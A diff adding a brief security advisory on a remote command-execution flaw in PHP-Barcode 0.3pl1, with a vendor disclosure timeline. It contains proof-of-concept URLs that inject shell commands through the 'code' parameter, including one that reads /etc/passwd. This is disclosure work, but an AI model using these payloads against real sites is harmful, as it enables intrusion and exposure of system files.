@@ -1,0 +1,28 @@
+PHP-Barcode 0.3pl1 Remote Code Execution
+
+The input passed to the code parameter is not sanitized and is used on
+a popen() function. This allows remote command execution and also
+allows to see environment vars:
+
+Windows
+
+http://www.site.com/php-barcode/barcode.php?code=%TMP%
+
+Linux
+
+http://www.site.com/php-barcode/barcode.php?code=012$PATH$d
+http://www.site.com/php-barcode/barcode.php?code=`uname%20-a`
+http://www.site.com/php-barcode/barcode.php?code=`tail%20-1%20/etc/passwd`
+
+Vendor:
+  http://www.ashberg.de/php-barcode/download/
+
+Vendor informed:
+  July  6 / 2011
+
+Vendor acknowledgement:
+  July 7 / 2011
+
+Fix not available from vendor.
+
+- beford
